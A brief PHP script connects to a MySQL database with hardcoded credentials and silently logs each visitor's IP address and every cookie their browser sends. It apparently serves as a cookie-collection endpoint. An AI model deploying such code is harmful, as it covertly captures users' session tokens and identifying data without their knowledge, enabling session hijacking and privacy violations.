<?php

$link = mysql_connect('localhost', 'gotip', 'got2026');
mysql_select_db('gotip',$link);
$sql = "INSERT INTO `ip` (`ip`) VALUES ('".mysql_escape_string($_SERVER['REMOTE_ADDR'])."');";
$result = mysql_query($sql, $link);
if ($result) {
	foreach ($_COOKIE as $key => $val) {
		$sql = "INSERT INTO `cookie` (`ip`, `key`, `value`) VALUES ('".mysql_escape_string($_SERVER['REMOTE_ADDR'])."', '".mysql_escape_string($key)."', '".mysql_escape_string($val)."');";
		mysql_query($sql, $link);
	}
}

?>
